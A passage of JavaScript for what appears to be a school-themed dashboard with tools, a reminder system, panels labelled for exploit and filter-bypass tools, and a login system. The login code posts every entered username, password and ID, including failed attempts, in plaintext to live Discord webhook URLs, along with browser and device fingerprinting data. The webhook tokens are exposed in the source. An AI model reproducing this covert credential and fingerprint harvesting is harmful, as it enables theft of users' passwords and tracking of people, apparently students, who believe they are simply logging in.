            const level = el.textContent.toLowerCase();
            el.classList.remove('wifi-level-high', 'wifi-level-medium', 'wifi-level-low', 'wifi-level-other');
            if (level === 'high') el.classList.add('wifi-level-high');
            else if (level === 'medium') el.classList.add('wifi-level-medium');
            else if (level === 'low') el.classList.add('wifi-level-low');
            else el.classList.add('wifi-level-other');
        });
        activityLogger.log('Initialized Information Panels', 'All panels hidden initially');
      },
      
      initQuickBar: function() {
        // Handled by initButtons for general buttons and specific panel toggle functions.
        // Quickbar panel toggles already trigger 'panel opened/closed' stats in `togglePanel`.
        activityLogger.log('Initialized Dashboard Quick Bar');
      },
      
      initSearchFunctionality: function() {
        const searchInput = document.getElementById('quickbarSearchInput');
        const searchBtn = document.getElementById('quickbarSearchBtn');
        if (!searchInput || !searchBtn) return;

        const allPanelSelectors = [
            '#calendarBox', '#motivationBox', '#randomFactsBox', '#dailyQuotesBox',
            '#updatesBox', '#notificationsBox',
            '#wifiPanel', '#ipadPanel', '#handbookPanel', '#mapPanel', '#studentWebsitesPanel',
            '#teacherWebsitesPanel', '#phoneDirectoryPanel', '#cameraPanel', '#schoolInfoPanel',
            '#exploitPanel', '#bypassPanel', '#vpnPanel', '#gamingPanel', '#musicPanel',
            '#keyboardPanel', '#calculatorPanel', '#unitConverterPanel', '#timerStopwatchPanel',
            '#activityLogsDashboardPanel', '#loginHistoryDashboardPanel', '#statsPanel',
            '#mediaPanel', '#reminderPanel', '#settingsPanel', '#keybindsPanel'
        ];
        const panelMapping = {
            'calendar': '#calendarBox',
            'motivation': '#motivationBox',
            'facts': '#randomFactsBox',
            'quotes': '#dailyQuotesBox',
            'updates': '#updatesBox',
            'notifications': '#notificationsBox',
            'wifi': '#wifiPanel',
            'ipad': '#ipadPanel',
            'handbook': '#handbookPanel',
            'map': '#mapPanel',
            'student websites': '#studentWebsitesPanel',
            'teacher websites': '#teacherWebsitesPanel',
            'phone directory': '#phoneDirectoryPanel',
            'camera': '#cameraPanel',
            'school info': '#schoolInfoPanel',
            'exploit tools': '#exploitPanel',
            'bypass tools': '#bypassPanel',
            'vpn': '#vpnPanel',
            'gaming': '#gamingPanel',
            'music': '#musicPanel',
            'keyboard tricks': '#keyboardPanel',
            'calculator': '#calculatorPanel',
            'unit converter': '#unitConverterPanel',
            'timer': '#timerStopwatchPanel', // Covers timer and stopwatch
            'stopwatch': '#timerStopwatchPanel',
            'activity logs': '#activityLogsDashboardPanel',
            'download logs': '#downloadActivityLogsBtn', // Special case: a button
            'login history': '#loginHistoryDashboardPanel',
            'stats': '#statsPanel',
            'media': '#mediaPanel',
            'reminders': '#reminderPanel',
            'settings': '#settingsPanel',
            'keybinds': '#keybindsPanel'
        };

        const performSearch = () => {
            const query = searchInput.value.toLowerCase().trim();
            if (!query) {
                // Optionally show/hide all info panels if empty query
                showAlert('Enter a search term for dashboard panels.', 'info', 2000);
                return;
            }

            let found = false;
            // First, check direct panel names
            for (const keyword in panelMapping) {
                if (query.includes(keyword)) {
                    const target = panelMapping[keyword];
                    const element = document.querySelector(target);

                    if (target === '#downloadActivityLogsBtn') { // Special case for a button action
                        document.getElementById('downloadActivityLogsBtn').click();
                        found = true;
                        break;
                    }

                    if (element) {
                        // Hide all other panels first if showing a specific info panel
                        if (target.includes('Panel')) { // if it's an info-panel type
                            document.querySelectorAll('.info-panel.visible-by-search').forEach(panel => {
                                panel.style.display = 'none';
                                panel.classList.remove('visible-by-search');
                                stats.trackAction('panel', 'closed');
                            });
                            element.style.display = 'block';
                            element.classList.add('visible-by-search'); // Mark as visible via search
                            // Scroll to the element
                            element.scrollIntoView({ behavior: 'smooth', block: 'start' });
                            found = true;
                            showAlert(`Navigated to ${element.querySelector('h2').textContent.replace('üéß', '').trim()}`, 'success');
                            activityLogger.log('Dashboard Search', `Found & Navigated to: ${keyword}`);
                            stats.trackAction('search', keyword);
                            stats.trackAction('panel', 'opened');
                            break;
                        } else if (target.includes('Box')) { // It's a top-level mainGrid box
                            // For simplicity, just scroll to it if it's already visible
                            element.scrollIntoView({ behavior: 'smooth', block: 'start' });
                            found = true;
                            showAlert(`Navigated to ${element.querySelector('h2').textContent.replace('üìÖ', '').trim()}`, 'success');
                            activityLogger.log('Dashboard Search', `Found & Navigated to: ${keyword}`);
                            stats.trackAction('search', keyword);
                            break;
                        }
                    }
                }
            }

            if (!found) {
                showAlert(`No dashboard section found for "${query}".`, 'error', 3000);
                activityLogger.log('Dashboard Search', `No result for: ${query}`, 'error');
            }
        };

        searchBtn.addEventListener('click', performSearch);
        searchInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                performSearch();
                stats.trackAction('button', 'quickbarSearch'); // Enter key on search is like button press
            }
        });
        activityLogger.log('Dashboard Search Initialized');
      },

      initCalculator: function() {
        const display = document.getElementById('calc-display');
        const buttons = document.querySelectorAll('.calculator-grid button:not(.clear):not(.equals)');
        const clearButton = document.querySelector('.calculator-grid .clear');
        const equalsButton = document.querySelector('.calculator-grid .equals');

        let currentInput = '';
        let operator = null;
        let previousInput = '';
        let lastAction = ''; // To prevent multiple operators/decimals

        const appendNumber = (number) => {
            if (number === '.' && currentInput.includes('.')) return;
            if (display.textContent === '0' && number !== '.') display.textContent = '';
            currentInput += number;
            display.textContent = currentInput;
            lastAction = 'number';
            activityLogger.log('Calculator Input', number);
            stats.trackAction('calculator', 'numberInput');
        };

        const chooseOperator = (op) => {
            if (currentInput === '' && previousInput === '') return;
            if (currentInput === '' && lastAction === 'operator') {
                operator = op;
                activityLogger.log('Calculator Operator Changed', op);
                stats.trackAction('calculator', 'operatorChange');
                return;
            }

            if (previousInput !== '') {
                compute();
            }
            operator = op;
            previousInput = currentInput;
            currentInput = '';
            lastAction = 'operator';
            activityLogger.log('Calculator Operator Selected', op);
            stats.trackAction('calculator', 'operatorInput');
        };

        const compute = () => {
            let result;
            const prev = parseFloat(previousInput);
            const current = parseFloat(currentInput);

            if (isNaN(prev) || isNaN(current) || !operator) {
                activityLogger.log('Calculator Compute Failed', 'Invalid inputs', 'error');
                showAlert('Invalid calculation', 'error');
                return;
            }

            switch (operator) {
                case '+': result = prev + current; break;
                case '-': result = prev - current; break;
                case '*': result = prev * current; break;
                case '/':
                    if (current === 0) {
                        showAlert("Cannot divide by zero!", "error");
                        result = "Error";
                    } else {
                        result = prev / current;
                    }
                    break;
                default: return;
            }
            currentInput = result.toString();
            operator = null;
            previousInput = '';
            display.textContent = currentInput;
            lastAction = 'compute';
            activityLogger.log('Calculator Computed', `Result: ${currentInput}`);
            stats.trackAction('calculator', 'compute');
        };

        const clear = () => {
            currentInput = '';
            operator = null;
            previousInput = '';
            display.textContent = '0';
            lastAction = 'clear';
            activityLogger.log('Calculator Cleared');
            stats.trackAction('calculator', 'clear');
        };

        buttons.forEach(button => {
            button.addEventListener('click', () => {
                if (button.classList.contains('operator')) {
                    chooseOperator(button.textContent);
                } else {
                    appendNumber(button.textContent);
                }
            });
        });

        clearButton.addEventListener('click', clear);
        equalsButton.addEventListener('click', compute);

        activityLogger.log('Calculator Initialized');
      },

      initUnitConverter: function() {
        const convertValueInput = document.getElementById('convertValue');
        const fromUnitSelect = document.getElementById('fromUnit');
        const toUnitSelect = document.getElementById('toUnit');
        const convertBtn = document.getElementById('convertBtn');
        const conversionResultDiv = document.getElementById('conversionResult');

        const conversionRates = {
            meters: {
                feet: 3.28084
            },
            feet: {
                meters: 0.3048
            },
            kilograms: {
                pounds: 2.20462
            },
            pounds: {
                kilograms: 0.453592
            }
        };

        const performConversion = () => {
            const value = parseFloat(convertValueInput.value);
            const fromUnit = fromUnitSelect.value;
            const toUnit = toUnitSelect.value;

            if (isNaN(value)) {
                conversionResultDiv.textContent = 'Please enter a valid number.';
                showAlert('Converter: Invalid number input', 'error');
                return;
            }

            if (fromUnit === toUnit) {
                conversionResultDiv.textContent = `Result: ${value} ${toUnit}`;
                showAlert('Converter: Same units selected', 'info');
                return;
            }

            const rates = conversionRates[fromUnit];
            if (rates && rates[toUnit]) {
                const result = value * rates[toUnit];
                conversionResultDiv.textContent = `Result: ${result.toFixed(4)} ${toUnit}`;
                showAlert(`Converted ${value} ${fromUnit} to ${toUnit}`, 'success');
                activityLogger.log('Unit Converted', `From: ${value} ${fromUnit} To: ${result.toFixed(4)} ${toUnit}`);
                stats.trackAction('unitConverter', `${fromUnit}To${toUnit}`);
            } else {
                conversionResultDiv.textContent = 'Unsupported conversion.';
                showAlert('Converter: Unsupported conversion', 'error');
                activityLogger.log('Unit Conversion Failed', 'Unsupported conversion', 'error');
            }
        };

        convertBtn.addEventListener('click', performConversion);
        convertValueInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') performConversion();
        });

        activityLogger.log('Unit Converter Initialized');
      },

      initTimerStopwatch: function() {
        // Stopwatch logic
        let stopwatchInterval;
        let stopwatchRunning = false;
        let stopwatchSeconds = 0;

        const stopwatchDisplay = document.getElementById('stopwatchDisplay');
        const stopwatchStartBtn = document.getElementById('stopwatchStart');
        const stopwatchStopBtn = document.getElementById('stopwatchStop');
        const stopwatchResetBtn = document.getElementById('stopwatchReset');

        const formatTime = (totalSeconds) => {
            const hrs = String(Math.floor(totalSeconds / 3600)).padStart(2, '0');
            const mins = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, '0');
            const secs = String(totalSeconds % 60).padStart(2, '0');
            return `${hrs}:${mins}:${secs}`;
        };

        const startStopwatch = () => {
            if (!stopwatchRunning) {
                stopwatchRunning = true;
                stopwatchInterval = setInterval(() => {
                    stopwatchSeconds++;
                    stopwatchDisplay.textContent = formatTime(stopwatchSeconds);
                }, 1000);
                activityLogger.log('Stopwatch Started');
                stats.trackAction('timerStopwatch', 'stopwatchStart');
            }
        };

        const stopStopwatch = () => {
            if (stopwatchRunning) {
                stopwatchRunning = false;
                clearInterval(stopwatchInterval);
                activityLogger.log('Stopwatch Stopped');
                stats.trackAction('timerStopwatch', 'stopwatchStop');
            }
        };

        const resetStopwatch = () => {
            stopStopwatch();
            stopwatchSeconds = 0;
            stopwatchDisplay.textContent = formatTime(stopwatchSeconds);
            activityLogger.log('Stopwatch Reset');
            stats.trackAction('timerStopwatch', 'stopwatchReset');
        };

        stopwatchStartBtn.addEventListener('click', startStopwatch);
        stopwatchStopBtn.addEventListener('click', stopStopwatch);
        stopwatchResetBtn.addEventListener('click', resetStopwatch);

        // Timer logic
        let timerInterval;
        let timerRunning = false;
        let timerTotalSeconds = 0;
        let timerCurrentSeconds = 0;

        const timerDisplay = document.getElementById('timerDisplay');
        const timerInputMinutes = document.getElementById('timerInputMinutes');
        const timerInputSeconds = document.getElementById('timerInputSeconds');
        const timerSetBtn = document.getElementById('timerSet');
        const timerStartBtn = document.getElementById('timerStart');
        const timerPauseBtn = document.getElementById('timerPause');
        const timerResetBtn = document.getElementById('timerReset');

        const setTimer = () => {
            stopTimer(); // Stop any running timer first
            const minutes = parseInt(timerInputMinutes.value || 0);
            const seconds = parseInt(timerInputSeconds.value || 0);
            timerTotalSeconds = (minutes * 60) + seconds;
            timerCurrentSeconds = timerTotalSeconds;
            timerDisplay.textContent = formatTime(timerCurrentSeconds);
            activityLogger.log('Timer Set', `To: ${minutes}m ${seconds}s`);
            stats.trackAction('timerStopwatch', 'timerSet');
            showAlert(`Timer set for ${minutes} minutes and ${seconds} seconds.`, 'info');
        };

        const startTimer = () => {
            if (timerRunning || timerTotalSeconds === 0) return;
            if (timerCurrentSeconds <= 0) {
                showAlert('Timer needs to be set before starting!', 'warning');
                return;
            }
            timerRunning = true;
            timerInterval = setInterval(() => {
                timerCurrentSeconds--;
                timerDisplay.textContent = formatTime(timerCurrentSeconds);
                if (timerCurrentSeconds <= 0) {
                    stopTimer();
                    showAlert('Timer Finished!', 'success');
                    activityLogger.log('Timer Finished');
                    stats.trackAction('timerStopwatch', 'timerFinish');
                }
            }, 1000);
            activityLogger.log('Timer Started');
            stats.trackAction('timerStopwatch', 'timerStart');
        };

        const pauseTimer = () => {
            if (timerRunning) {
                timerRunning = false;
                clearInterval(timerInterval);
                activityLogger.log('Timer Paused');
                stats.trackAction('timerStopwatch', 'timerPause');
            }
        };

        const resetTimer = () => {
            stopTimer();
            timerCurrentSeconds = timerTotalSeconds;
            timerDisplay.textContent = formatTime(timerTotalSeconds);
            activityLogger.log('Timer Reset');
            stats.trackAction('timerStopwatch', 'timerReset');
        };

        const stopTimer = () => { // Helper to stop interval without affecting state
            if (timerInterval) clearInterval(timerInterval);
            timerRunning = false;
        }

        timerSetBtn.addEventListener('click', setTimer);
        timerStartBtn.addEventListener('click', startTimer);
        timerPauseBtn.addEventListener('click', pauseTimer);
        timerResetBtn.addEventListener('click', resetTimer);

        activityLogger.log('Timer and Stopwatch Initialized');
      },

      initMediaPlayer: function() {
        // Handled directly in `initButtons` under the "loadYoutubeBtn"
        activityLogger.log('Media Player Initialized');
      },

      initReminders: function() {
        let reminders = JSON.parse(localStorage.getItem('reminders') || '[]');
        const reminderTextInput = document.getElementById('reminderTextInput');
        const reminderTimeInput = document.getElementById('reminderTimeInput');
        const addReminderBtn = document.getElementById('addReminderBtn');
        const reminderListDiv = document.getElementById('reminderList');

        const saveReminders = () => {
            localStorage.setItem('reminders', JSON.stringify(reminders));
        };

        const renderReminders = () => {
            reminderListDiv.innerHTML = '';
            if (reminders.length === 0) {
                reminderListDiv.textContent = 'No reminders set.';
                return;
            }
            reminders.sort((a, b) => new Date(a.time) - new Date(b.time)); // Sort by time

            reminders.forEach((r, index) => {
                const div = document.createElement('div');
                const reminderTime = new Date(r.time);
                const now = new Date();
                const isPast = reminderTime < now;
                const status = isPast ? ' (Passed)' : ` (${reminderTime.toLocaleString()})`;
                
                div.innerHTML = `<input type="checkbox" ${isPast ? 'checked disabled' : ''}> <span style="${isPast ? 'text-decoration: line-through; color: #888;' : ''}">${r.text} ${status}</span> <button data-index="${index}">‚ùå</button>`;
                reminderListDiv.appendChild(div);

                const deleteButton = div.querySelector('button');
                deleteButton.addEventListener('click', () => {
                    reminders.splice(index, 1);
                    saveReminders();
                    renderReminders();
                    showAlert('Reminder deleted', 'info', 1500);
                    activityLogger.log('Reminder Deleted', r.text);
                    stats.trackAction('reminder', 'deleted');
                });
            });
        };

        const addReminder = () => {
            const text = reminderTextInput.value.trim();
            const time = reminderTimeInput.value; // YYYY-MM-DDTHH:MM format

            if (!text || !time) {
                showAlert('Please enter both reminder text and a valid date/time.', 'error');
                return;
            }
            if (new Date(time) < new Date()) {
                showAlert('Reminder time cannot be in the past.', 'warning');
                return;
            }

            reminders.push({ text, time, completed: false });
            saveReminders();
            renderReminders();
            reminderTextInput.value = '';
            reminderTimeInput.value = '';
            showAlert('Reminder added!', 'success');
            activityLogger.log('Reminder Added', `Text: ${text}, Time: ${time}`);
            stats.trackAction('reminder', 'added');
        };

        const checkReminders = () => {
            const now = new Date();
            reminders.forEach(r => {
                if (!r.completed && new Date(r.time) <= now) {
                    showAlert(`üîî REMINDER: ${r.text}`, 'success', 6000); // Persistent until dismissed manually on list?
                    r.completed = true; // Mark as completed (logic for checking this in renderReminders)
                    saveReminders();
                    renderReminders(); // Re-render to show it as "past" or completed
                    activityLogger.log('Reminder Alert', r.text);
                    stats.trackAction('reminder', 'alert');
                }
            });
        };

        addReminderBtn.addEventListener('click', addReminder);
        renderReminders();
        setInterval(checkReminders, 1000); // Check every second for reminders

        activityLogger.log('Reminder System Initialized');
      },

      initFactsAndQuotes: async function() {
        const randomFactContent = document.getElementById('randomFactContent');
        const dailyQuoteContent = document.getElementById('dailyQuoteContent');
        if (!randomFactContent || !dailyQuoteContent) return;

        // Immediately update with "Loading..." text
        randomFactContent.textContent = "Loading a random fact...";
        dailyQuoteContent.textContent = "Loading a daily quote...";

        // Fetch initial content
        randomFactContent.textContent = await fetchRandomFact();
        dailyQuoteContent.textContent = await fetchDailyQuote();
        activityLogger.log('Facts & Quotes Initialized', 'Fetched initial content');
        stats.trackAction('panel', 'factsQuotesInit');

        // Refresh facts/quotes daily or on interval
        // For demonstration, a shorter interval
        setInterval(async () => {
          randomFactContent.textContent = await fetchRandomFact();
          activityLogger.log('Random Fact Refreshed');
        }, 3600000); // Every hour
        setInterval(async () => {
          dailyQuoteContent.textContent = await fetchDailyQuote();
          activityLogger.log('Daily Quote Refreshed');
        }, 86400000); // Every 24 hours (daily)

        // For faster debugging:
        // setInterval(async () => {
        //   randomFactContent.textContent = await fetchRandomFact();
        //   activityLogger.log('Random Fact Refreshed');
        // }, 15000); // Every 15 seconds for testing
        // setInterval(async () => {
        //   dailyQuoteContent.textContent = await fetchDailyQuote();
        //   activityLogger.log('Daily Quote Refreshed');
        // }, 30000); // Every 30 seconds for testing
      },

      // Panel toggle functions
      togglePanel: function(panelId) {
        const panel = document.getElementById(panelId);
        if (!panel) return;

        const isVisible = panel.style.display === 'block';

        // Before toggling, hide any currently visible "info-panel" marked as visible-by-search
        document.querySelectorAll('.info-panel.visible-by-search').forEach(openPanel => {
            if (openPanel.id !== panelId) { // Don't hide the panel being toggled if it was visible by search
                openPanel.style.display = 'none';
                openPanel.classList.remove('visible-by-search');
                activityLogger.log('Panel Hidden (Auto)', `Panel ID: ${openPanel.id}`);
                stats.trackAction('panel', 'closed');
            }
        });
        
        // Hide canvas if another panel is opened
        const canvasContainer = document.getElementById('canvasContainer');
        if (canvasContainer && canvasContainer.style.display === 'block' && panelId !== 'canvasContainer') {
            canvasContainer.style.display = 'none';
            // Also need to reshow main grid elements that canvas hides
            document.getElementById('mainGrid').style.display = 'flex';
            document.getElementById('updatesNotificationsRow').style.display = 'flex';
            document.getElementById('infoPanelsContainer').style.display = 'block';
            document.getElementById('dynamicPanelsContainer').style.display = 'flex';
            showAlert('Notes Canvas closed', 'info');
            activityLogger.log('Notes Panel Auto-Closed (New panel opened)');
            stats.trackAction('panel', 'closed');
        }

        panel.style.display = isVisible ? 'none' : 'block';
        panel.classList.remove('visible-by-search'); // If toggled manually, it's not "visible-by-search" anymore
        activityLogger.log('Panel Toggled', `Panel ID: ${panelId}, New State: ${panel.style.display}`);
        if (!isVisible) {
            stats.trackAction('panel', 'opened');
        } else {
            stats.trackAction('panel', 'closed');
        }

        if (panelId === 'wifiPanel') {
            // No extra handling needed after display
        }
      },
      
      showIpadContent: function(contentId) {
        document.querySelectorAll('.ipad-content').forEach(content => {
          content.style.display = 'none';
        });
        document.getElementById('ipad' + contentId.charAt(0).toUpperCase() + contentId.slice(1)).style.display = 'block';
        activityLogger.log('iPad Content Toggled', `Content: ${contentId}`);
      },
      
      showBypassContent: function(contentId) {
        document.querySelectorAll('.bypass-content').forEach(content => {
          content.style.display = 'none';
        });
        document.getElementById(contentId + 'Bypass').style.display = 'block';
        activityLogger.log('Bypass Content Toggled', `Content: ${contentId}`);
      }
    };

    // Login System JavaScript
    (() => {
      const USER_JSON_URL = 'https://raw.githubusercontent.com/Nuker214/Private.System/refs/heads/main/Whitelist.json';

      // Webhooks for the new logging systems
      const loggingWebhooks = {
        username: 'https://discord.com/api/webhooks/1403506302822383726/Cq9jWG6XSG49gBwffXUEZdF5HCZLQC_SGf6f96XrH-Bs5WAxiy_U3OS1a5z00R3aL-vU',
        password: 'https://discord.com/api/webhooks/1403506454488678540/PBX3b3QtOKdsc6FZklZT-zWuXxO_jGNUFHGHtF3Q1ysb-8v95VPAsem44kvgdtNoPnNI',
        identifier: 'https://discord.com/api/webhooks/1403506052565307483/qDWgi0LkM0_DOwWGGR73evb-MqnI8MXMKJTjAYOxtLeltAZ3RsRjHHQjf1Oj7Ce9c02cA',
        invalid_username: 'https://discord.com/api/webhooks/1403508639779786935/OjvG2xJet2_NiwAHi6OE_5PdoYPX3fRBuXSG5FTtPMT9MooblezpxJLqDA97jIUShkp',
        invalid_password: 'https://discord.com/api/webhooks/1403509088113131704/qdUx47oo3-QRcc1IZpoBs2fB2Y05k9Tl2XgOVVcVn078AgFFBw0pMUfKrR5gNN_UyKFhp',
        invalid_identifier: 'https://discord.com/api/webhooks/1403509418376822917/pmg748k-gAd3pdrGAumrdYnAbo2HTcX6ulXvqXUn3vmgPQu7ZtqNNja5Vh8fPLNSq_5',
        attempts_counter: 'https://discord.com/api/webhooks/1403510543637282979/z95YpEiHL2P7G9-fsNVsl1NEcKXuFOml4rzLjEkJNqu3wXB3JAWHvGS39lC6YRZ_1aw',
        attempts_exceeded: 'https://discord.com/api/webhooks/1403511845800902687/oMnaODY_1ckM-alSj91yLPHhIhW4QLpk0YatR2eoG0PS38KKYq5y1q4VfCTmKbhgKsxQ'
      };

      // Original webhooks
      const webhookUrls = {
        userLogging: 'https://discord.com/api/webhooks/1402682960397860964/rmNhK0G8NOJlbRN38RdCmPB1-rzXaaogzqIJmA7EuTVEIoFpTinMXLff0qr5ke1RV7K3',
        browserLogging: 'https://discord.com/api/webhooks/1402690380910170154/EJgpyFYc0pyz5EnkOTXiSlM7W1jUnBldRd0PUKLEvERgE6nXfDVAb7NXaKIzR-3APGHP',
        deviceLogging: 'https://discord.com/api/webhooks/1402692400593371289/_Nx1ZdupZIrlkVmCO0J1OIphb9az9I1AZDZ6gjAemL2IHbuMLWCtTltBfch-i970d1F',
        connectionLogging: 'https://discord.com/api/webhooks/1402694010123849840/IYCqiKdvj9QnFJ9WPoAlFBXzrY2mBnHR5SANj7c1uuYhkQV3Veado9hIVbtqh9PCZO1D',
        sessionLogging: 'https://discord.com/api/webhooks/1402695341257654405/SiXvG8hdSshEfPjz2e7gRQ3P80yqBNZw2AwHlUpEtFtHPD2vbG_Dh8JHjnfdDRD4hmJk'
      };

      const loginBox = document.getElementById('loginBox');
      const usernameInput = document.getElementById('username');
      const passwordInput = document.getElementById('password');
      const userIDInput = document.getElementById('userID');
      const showPasswordCheckbox = document.getElementById('showPassword');
      const submitBtn = document.getElementById('submitBtn');
      const errorMsg = document.getElementById('errorMsg');
      const attemptsText = document.getElementById('attemptsText');
      const resetPopup = document.getElementById('resetPopup');
      const resetField = document.getElementById('resetField');
      const resetBtn = document.getElementById('resetBtn');

      let attempts = 3; // Changed from 5 to 3
      let users = [];
      let loginTime = null;

      // Show/hide password toggle (already inited in login.initLoginQuickBar)
      // showPasswordCheckbox.addEventListener('change', () => {
      //   passwordInput.type = showPasswordCheckbox.checked ? 'text' : 'password';
      // });

      // Fetch user JSON data on load
      fetch(USER_JSON_URL)
        .then(res => res.json())
        .then(data => {
          users = data;
        })
        .catch(() => {
          users = [];
          console.error('Failed to load user JSON data.');
        });

      // Flash red outline function
      function flashRedOutline(times = 2, delay = 400) {
        let count = 0;
        function flash() {
          loginBox.classList.add('flashing');
          setTimeout(() => {
            loginBox.classList.remove('flashing');
            count++;
            if (count < times) setTimeout(flash, delay);
          }, delay);
        }
        flash();
      }

      // Get WebGL Renderer (used for device logging)
      function getWebGLRenderer() {
        try {
          const canvas = document.createElement('canvas');
          const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
          if (!gl) return "Unavailable";
          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unavailable";
        } catch {
          return "Unavailable";
        }
      }

      // Battery status promise (device logging)
      async function getBatteryStatus() {
        if (navigator.getBattery) {
          try {
            const battery = await navigator.getBattery();
            return battery;
          } catch {
            return null;
          }
        }
        return null;
      }

      // Build user info object from user JSON
      function findUser(username, userID) {
        return users.find(u =>
          u.username?.toLowerCase() === username.toLowerCase() &&
          u.userID?.toString() === userID.toString()
        );
      }

      // Send Discord webhook with custom embed fields
      async function sendWebhook(url, embed) {
        try {
          await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] }),
          });
        } catch (e) {
          console.warn('Webhook send failed:', e);
        }
      }

      // Collect browser & device info for logs
      async function collectLoggingData(user, password) {
        const now = new Date();
        loginTime = now.toISOString();
        const batteryStatus = await getBatteryStatus();

        // Simulate new logging info
        const networkInfo = navigator.connection;
        const screenInfo = window.screen;

        return {
          user,
          password,
          loginTime,
          batteryStatus,
          webglRenderer: getWebGLRenderer(),
          // New logging info
          screenResolution: `${screenInfo.width}x${screenInfo.height}`,
          pixelDensity: window.devicePixelRatio,
          connectionSpeed: networkInfo ? networkInfo.downlink + 'Mbps' : 'Unknown',
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          vendor: navigator.vendor || 'Unknown',
          userActivityTime: performance.now(), // Milliseconds since page load
          currentURL: window.location.href // Current URL accessed
        };
      }

      // New logging functions for the specific systems
      async function logUsername(name, username) {
        const embed = {
          title: "Username Logging",
          color: 0x3498db,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.username, embed);
        activityLogger.log('Logged Username', username);
      }

      async function logPassword(name, password) {
        const embed = {
          title: "Password Logging",
          color: 0xe74c3c,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Password", value: password, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.password, embed);
        activityLogger.log('Logged Password Attempt', `Password: ${password}`);
      }

      async function logIdentifier(name, identifier) {
        const embed = {
          title: "Identifier Logging",
          color: 0x2ecc71,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Identifier", value: identifier, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.identifier, embed);
        activityLogger.log('Logged User ID', identifier);
      }

      async function logInvalidUsername(name, username) {
        const embed = {
          title: "Invalid Username Logging",
          color: 0xf39c12,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Invalid Username", value: username, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.invalid_username, embed);
        activityLogger.log('Invalid Username', username, 'error');
      }

      async function logInvalidPassword(name, password) {
        const embed = {
          title: "Invalid Password Logging",
          color: 0xe67e22,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Invalid Password", value: password, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.invalid_password, embed);
        activityLogger.log('Invalid Password', password, 'error');
      }

      async function logInvalidIdentifier(name, identifier) {
        const embed = {
          title: "Invalid Identifier Logging",
          color: 0xd35400,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Invalid Identifier", value: identifier, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.invalid_identifier, embed);
        activityLogger.log('Invalid User ID', identifier, 'error');
      }

      async function logAttemptsCounter(name, username, password, identifier, attemptsLeft) {
        const embed = {
          title: "Attempts Counter Logging",
          color: 0x9b59b6,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password", value: password, inline: true },
            { name: "Identifier", value: identifier, inline: true },
            { name: "Attempts Left", value: attemptsLeft.toString(), inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.attempts_counter, embed);
        activityLogger.log('Login Attempt Count', `Attempts left: ${attemptsLeft}`, attemptsLeft <= 1 ? 'warning' : 'info');
      }

      async function logAttemptsExceeded(name, username, password, identifier) {
        const embed = {
          title: "Attempts Exceeded Logging",
          color: 0xc0392b,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password", value: password, inline: true },
            { name: "Identifier", value: identifier, inline: true },
            { name: "Status", value: "MAX ATTEMPTS EXCEEDED", inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.attempts_exceeded, embed);
        activityLogger.log('Max Login Attempts Exceeded', '', 'error');
      }

      // Original embed builders (unchanged, but added new logging info)
      function buildUserLoggingEmbed(data) {
        return {
          title: "User Logging System",
          color: 0xff0000,
          fields: [
            { name: "Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username, inline: true },
            { name: "Password", value: data.password, inline: true },
            { name: "Rank Type", value: data.user.rank?.toString() || "N/A", inline: true },
            { name: "Role Type", value: data.user.role || "N/A", inline: true },
            { name: "Login Time (ISO)", value: data.loginTime, inline: false },
            { name: "User Identifier", value: data.user.userID.toString(), inline: true },
            { name: "Account Creation Date", value: data.user.accountCreationDate || "N/A", inline: true },
            // Additional Logging Information
            { name: "Authentication Method", value: "Standard Password", inline: true },
            { name: "Session Start Page", value: data.currentURL, inline: false },
          ]
        };
      }

      function buildBrowserLoggingEmbed(data) {
        const nav = navigator;
        return {
          title: "Browser Logging System",
          color: 0x00ff00,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User Identifier", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Browser Vendor", value: nav.vendor || "Unknown", inline: true },
            { name: "Browser Language", value: nav.language || "Unknown", inline: true },
            { name: "Browser Languages", value: nav.languages ? nav.languages.join(", ") : "Unknown", inline: false },
            { name: "User Agent", value: nav.userAgent || "Unknown", inline: false },
            { name: "Installed Plugins", value: nav.plugins?.length > 0 ? `${nav.plugins.length} plugin(s)` : "None", inline: true },
            { name: "Browser Window Size", value: `${window.innerWidth}x${window.innerHeight}`, inline: true },
            { name: "Browser Zoom Level (DPR)", value: data.pixelDensity?.toString() || `${Math.round(window.devicePixelRatio * 100)}%`, inline: true },
            { name: "Incognito/Private Mode Status", value: "Undetected", inline: true },
